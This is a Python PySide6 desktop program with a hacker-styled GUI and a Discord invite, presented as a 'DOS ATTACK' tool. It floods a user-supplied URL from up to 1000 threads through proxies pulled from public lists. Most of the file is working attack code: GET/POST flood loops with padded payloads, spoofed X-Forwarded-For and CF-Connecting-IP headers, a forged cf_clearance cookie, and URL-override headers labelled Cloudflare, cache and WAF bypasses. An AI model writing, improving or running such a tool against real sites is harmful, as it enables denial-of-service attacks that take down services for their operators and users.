from PySide6.QtWidgets import *
from PySide6.QtCore import *
from PySide6.QtGui import *
import requests
import threading
import time
import re
import random
from concurrent.futures import ThreadPoolExecutor
import sys
import webbrowser
from pe import MatrixBackground
import urllib3
import os
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class DOSAttacker(QMainWindow):
    log_signal = Signal(str)  

    def __init__(self):
        super().__init__()
        self.proxy_list = []
        self.running_attacks = []  
        self.stop_event = threading.Event()
        
        self.setWindowOpacity(0)
        self.fade_in_animation = QPropertyAnimation(self, b"windowOpacity")
        self.fade_in_animation.setStartValue(0)
        self.fade_in_animation.setEndValue(1)
        self.fade_in_animation.setDuration(1000)  

        if not self.check_internet():
            QMessageBox.critical(None, "Error", "No hay conexión a internet")
            sys.exit()

        self.setWindowTitle("TODO HACK OFFICIAL - HABIBIS DOS ATTACK SIMPLE : BY MAMASITA THO")
        self.setFixedSize(900, 700)
        
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.setWindowFlags(Qt.FramelessWindowHint)  
        
        self.matrix_background = MatrixBackground(self)
        self.matrix_background.resize(self.size())
        
        central_widget = QWidget()
        central_widget.setAttribute(Qt.WA_TranslucentBackground)
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)
        layout.setContentsMargins(20, 20, 20, 20)
        
        container = QWidget()
        container.setObjectName("glassContainer")
        container_layout = QVBoxLayout(container)
        layout.addWidget(container)
        
        header_layout = QHBoxLayout()
        
        buttons_layout = QHBoxLayout()
        minimize_btn = QPushButton("−")
        minimize_btn.setStyleSheet("""
            QPushButton {
                background-color: transparent;
                color: #00ff00;
                border: 2px solid #00ff00;
                border-radius: 5px;
                padding: 5px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #00ff00;
                color: black;
            }
        """)
        minimize_btn.setObjectName("minimizeButton")
        minimize_btn.clicked.connect(self.showMinimized)
        buttons_layout.addWidget(minimize_btn)

        close_btn = QPushButton("✖")
        close_btn.setStyleSheet("""
            QPushButton {
                background-color: transparent;
                color: #ff0000;
                border: 2px solid #ff0000;
                border-radius: 5px;
                padding: 5px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #ff0000;
                color: white;
            }
        """)
        close_btn.setObjectName("closeButton")
        close_btn.clicked.connect(self.close)
        buttons_layout.addWidget(close_btn)
        header_layout.addLayout(buttons_layout)
        
        title = QLabel("TODO HACK OFFICIAL")
        title.setStyleSheet("QLabel { color: #00ff00; font-weight: bold; font-size: 16px; }")
        title.setObjectName("mainTitle")
        
        discord_container = QWidget()
        discord_container.setObjectName("discordContainer")
        discord_layout = QHBoxLayout(discord_container)
        
        discord_logo = QLabel()
      
        logo_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "assets", "discord_icon.png")
        if hasattr(sys, '_MEIPASS'):  
            logo_path = os.path.join(sys._MEIPASS, "assets", "discord_icon.png")
            
        discord_pixmap = QPixmap(logo_path)
        if not discord_pixmap.isNull():
            discord_logo.setPixmap(discord_pixmap.scaled(48, 48, Qt.KeepAspectRatio, Qt.SmoothTransformation))
        else:
            discord_logo.setText("D")
            discord_logo.setStyleSheet("QLabel { color: #7289da; font-weight: bold; font-size: 24px; }")
        
        discord_logo.setFixedSize(48, 48)
        discord_layout.addWidget(discord_logo)
        
        discord_button = QPushButton("¡ÚNETE A DISCORD!")
        discord_button.setStyleSheet("""
            QPushButton {
                background-color: transparent;
                color: #7289da;
                border: 2px solid #7289da;
                border-radius: 5px;
                padding: 5px 10px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #7289da;
                color: white;
            }
        """)
        discord_button.setObjectName("discordButton")
        discord_button.clicked.connect(lambda: webbrowser.open('https://discord.gg/Zcq7GD3FFH'))
        
        discord_layout.addWidget(discord_button)
        
        header_layout.addWidget(title)
        header_layout.addStretch()
        header_layout.addWidget(discord_container)
        container_layout.addLayout(header_layout)
        
        subtitle = QLabel("HABIBIS DOS ATTACK SIMPLE : BY HANNIBAL THO")
        subtitle.setStyleSheet("QLabel { color: #00ff00; font-weight: bold; }")
        subtitle.setObjectName("subtitle")
        subtitle.setAlignment(Qt.AlignCenter)
        container_layout.addWidget(subtitle)
        
        form_layout = QFormLayout()
        url_label = QLabel("URL:")
        packs_label = QLabel("PAQUETES:")
        method_label = QLabel("MÉTODO:")
        url_label.setStyleSheet("QLabel { color: #00ff00; font-weight: bold; }")
        packs_label.setStyleSheet("QLabel { color: #00ff00; font-weight: bold; }")
        method_label.setStyleSheet("QLabel { color: #00ff00; font-weight: bold; }")
        
        self.url_input = QLineEdit()
        self.threads_input = QLineEdit()
        self.threads_input.setPlaceholderText("Máximo 1000 paquetes")
        self.threads_input.setValidator(QIntValidator(1, 1000))
        self.method_combo = QComboBox()
        self.method_combo.addItems([
            'FLOOD ATTACK (GET + POST)',
            'BYPASS ATTACK (HEAD + GET)', 
            'PROXY ROTATION ATTACK',
            'CLOUDFLARE BYPASS',
            'CACHE BYPASS ATTACK',
            'WAF EVASION ATTACK'
        ])
        
        self.url_input.setStyleSheet("QLineEdit { background-color: transparent; color: #00ff00; border: 1px solid #00ff00; border-radius: 5px; padding: 5px; }")
        self.threads_input.setStyleSheet("QLineEdit { background-color: transparent; color: #00ff00; border: 1px solid #00ff00; border-radius: 5px; padding: 5px; }")
        self.method_combo.setStyleSheet("""
            QComboBox {
                background-color: transparent;
                color: #00ff00;
                border: 1px solid #00ff00;
                border-radius: 5px;
                padding: 5px;
            }
            QComboBox::drop-down {
                border: none;
            }
            QComboBox::down-arrow {
                image: none;
            }
        """)
        
        form_layout.addRow(url_label, self.url_input)
        form_layout.addRow(packs_label, self.threads_input)
        form_layout.addRow(method_label, self.method_combo)
        container_layout.addLayout(form_layout)

        proxy_layout = QHBoxLayout()
        self.load_proxies_btn = QPushButton("📁 SELECCIONAR UN PROXI")
        self.fetch_proxies_btn = QPushButton("🔎 BUSCAR PROXIES")
        
        self.load_proxies_btn.setStyleSheet("""
            QPushButton {
                background-color: transparent;
                color: #00ff00;
                border: 2px solid #00ff00;
                border-radius: 5px;
                padding: 5px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #00ff00;
                color: black;
            }
        """)
        self.fetch_proxies_btn.setStyleSheet(self.load_proxies_btn.styleSheet())
        
        self.load_proxies_btn.clicked.connect(self.load_proxies)
        self.fetch_proxies_btn.clicked.connect(self.fetch_proxies)
        
        proxy_layout.addWidget(self.load_proxies_btn)
        proxy_layout.addWidget(self.fetch_proxies_btn)
        container_layout.addLayout(proxy_layout)

        button_layout = QHBoxLayout()
        self.start_btn = QPushButton("🚀 INICIAR ATAQUE")
        self.stop_btn = QPushButton("🛑 DETENER ATAQUE")
        self.clear_btn = QPushButton("🗑️ CLEAR LOG")
        
        for btn in [self.start_btn, self.stop_btn, self.clear_btn]:
            btn.setStyleSheet("""
                QPushButton {
                    background-color: transparent;
                    color: #00ff00;
                    border: 2px solid #00ff00;
                    border-radius: 5px;
                    padding: 5px;
                    font-weight: bold;
                }
                QPushButton:hover {
                    background-color: #00ff00;
                    color: black;
                }
            """)
        
        self.stop_btn.setObjectName("stop")
        self.clear_btn.setObjectName("clear")
        self.start_btn.clicked.connect(self.start_attack)
        self.stop_btn.clicked.connect(self.stop_attack)
        self.clear_btn.clicked.connect(self.clear_log)
        
        button_layout.addWidget(self.start_btn)
        button_layout.addWidget(self.stop_btn)
        button_layout.addWidget(self.clear_btn)
        container_layout.addLayout(button_layout)

        self.log_console = QTextEdit()
        self.log_console.setReadOnly(True)
        self.log_console.setStyleSheet("""
            QTextEdit {
                background-color: rgba(0, 0, 0, 150);
                color: #00ff00;
                border: 1px solid #00ff00;
                border-radius: 5px;
                padding: 5px;
                font-family: 'Consolas';
            }
        """)
        container_layout.addWidget(self.log_console)

        self.executor = None
        self.log_signal.connect(self.update_log)
        
        self.dragging = False
        self.offset = QPoint()

        self.show()
        self.fade_in_animation.start()

    def check_internet(self):
        try:

            requests.get("http://8.8.8.8", timeout=5)
            return True
        except:
            try:
   
                requests.get("http://1.1.1.1", timeout=5)
                return True
            except:
                return True  

    def validar_url(self, url):
        regex = re.compile(
            r'^(?:http|ftp)s?://'
            r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'
            r'localhost|'
            r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|'
            r'\[?[A-F0-9]*:[A-F0-9:]+\]?)'
            r'(?::\d+)?'
            r'(?:/?|[/?]\S+)$', re.IGNORECASE)
        return re.match(regex, url) is not None

    def load_proxies(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Seleccionar archivo de proxies", "", "Archivos de texto (*.txt)")
        if file_path:
            try:
                with open(file_path, 'r') as file:
                    self.proxy_list = [line.strip() for line in file if line.strip()]
                self.log_signal.emit(f"✅ {len(self.proxy_list)} proxies cargados")
            except Exception as e:
                self.log_signal.emit(f"❌ Error al cargar proxies: {str(e)}")

    def fetch_proxies(self):
        self.log_signal.emit("🔍 Buscando proxies...")
        threading.Thread(target=self._fetch_proxies_thread).start()

    def _fetch_proxies_thread(self):
        try:
            self.log_signal.emit("🔄 CARGANDO PROXIES...")
            
            proxy_apis = {
                "api1": "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
                "api2": "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
                "api3": "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
                "api4": "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt"
            }
            
            all_proxies = set()
            
            for name, api in proxy_apis.items():
                try:
                    response = requests.get(api, timeout=10, verify=False)
                    if response.status_code == 200:
                        proxies = [p.strip() for p in response.text.split('\n') if ':' in p]
                        all_proxies.update(proxies)
                        self.log_signal.emit(f"✅ Cargados {len(proxies)} proxies de {name}")
                except:
                    continue

            if not all_proxies:
        
                backup_proxies = [
                    "147.135.255.62:8123",
                    "51.79.52.80:3128",
                    "65.21.3.120:80",
                    "88.198.24.108:8080",
                    "167.71.5.83:8080"
                ]
                all_proxies.update(backup_proxies)
                self.log_signal.emit("⚠️ Usando lista de proxies de respaldo")

            self.proxy_list = list(all_proxies)
            self.log_signal.emit(f"✅ Total proxies cargados: {len(self.proxy_list)}")

        except Exception as e:
            self.proxy_list = []  
            self.log_signal.emit(f"❌ Error: {str(e)}")

    def send_requests(self, url):
        https_headers = {
            "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/{random.randint(70,103)}.0.{random.randint(1000,5000)}.0",
            "Accept": "*/*", 
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1"
        }

        method = self.method_combo.currentText()
        
        session = requests.Session()
        session.verify = False
        session.trust_env = False
        
        session.max_redirects = 5
        session.timeout = (10, 20)  

        while not self.stop_event.is_set():
            try:
                proxy = random.choice(self.proxy_list) if self.proxy_list else None
                if not proxy:
                    continue
                    
                proxies = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}" 
                }

                data = {
                    "timestamp": str(int(time.time() * 1000)),
                    "token": random.randbytes(16).hex(),
                    "data": "A" * random.randint(500, 1000)
                }

                if "FLOOD" in method:
    
                    for _ in range(5):
                        session.post(url, data=data, headers=https_headers, proxies=proxies, timeout=(5,10))
                        session.get(url, headers=https_headers, proxies=proxies, timeout=(5,10))
                        
                elif "BYPASS" in method:
                    headers = https_headers.copy()
                    headers.update({
                        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                        "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                        "Client-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                        "X-Forwarded-Proto": "https"
                    })
                    session.head(url, headers=headers, proxies=proxies, timeout=(5,10))
                    
                elif "CLOUDFLARE" in method:
                    headers = https_headers.copy() 
                    headers.update({
                        "CF-Connecting-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                        "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                        "CF-IPCountry": random.choice(["US","GB","FR","DE","IT","ES","CA","AU","JP"]),
                        "CF-RAY": f"{random.randbytes(16).hex()}",
                        "Cookie": f"cf_clearance={random.randbytes(32).hex()}"
                    })
                    session.get(url, headers=headers, proxies=proxies, timeout=(5,10))
                    
                else: 
                    headers = https_headers.copy()
                    headers.update({
                        "X-Original-URL": "/",
                        "X-Rewrite-URL": "/", 
                        "X-Override-URL": "/",
                        "X-Remote-Addr": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    })
                    session.get(url, headers=headers, proxies=proxies, timeout=(5,10))

                if not self.stop_event.is_set():
                    self.log_signal.emit(f"✅ Ataque enviado: {method}")
                    
            except requests.exceptions.RequestException:
         
                continue
            except Exception as e:
                if not self.stop_event.is_set():
                    self.log_signal.emit(f"⚠️ Error general: {str(e)}")
                time.sleep(0.1)

    def start_attack(self):
        try:
            url = self.url_input.text().strip()
            threads = self.threads_input.text()

            if not url or not self.validar_url(url):
                self.log_signal.emit("❌ URL inválida")
                return
            if not threads.isdigit() or int(threads) <= 0:
                self.log_signal.emit("❌ Número de paquetes inválido")
                return

            if self.executor:
                self.stop_attack()

            self.stop_event.clear()
            threads_count = min(int(threads), 1000)  
            self.executor = ThreadPoolExecutor(max_workers=threads_count)
            
            self.log_signal.emit(f"🚀 Iniciando ataque masivo con {threads_count} threads a {url}")
            
            for _ in range(threads_count):
                thread = threading.Thread(target=self.send_requests, args=(url,))
                thread.start()
                self.running_attacks.append(thread)
                
        except Exception as e:
            self.log_signal.emit(f"❌ ERROR AL INICIAR: {str(e)}")

    def stop_attack(self):
        self.stop_all_attacks()

    def stop_all_attacks(self):
        self.stop_event.set()
        if self.executor:
            self.executor.shutdown(wait=False)
            self.executor = None
        
        for thread in self.running_attacks:
            if thread.is_alive():
                thread.join(timeout=1)
        
        self.running_attacks.clear()
        self.log_signal.emit("🛑 Todos los ataques detenidos")

    def clear_log(self):
        self.log_console.clear()
        self.log_signal.emit("🧹 Consola limpiada")

    def update_log(self, message):
        self.log_console.append(f"[{time.strftime('%H:%M:%S')}] {message}")

    def mousePressEvent(self, event):
        if event.button() == Qt.LeftButton:
            self.dragging = True
            self.offset = event.position().toPoint()  

    def mouseMoveEvent(self, event):
        if self.dragging:
            self.move(event.globalPosition().toPoint() - self.offset)  

    def mouseReleaseEvent(self, event):
        if event.button() == Qt.LeftButton:
            self.dragging = False

    def closeEvent(self, event):
        self.stop_all_attacks()
        event.accept()

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = DOSAttacker()
    window.show()

    sys.exit(app.exec())


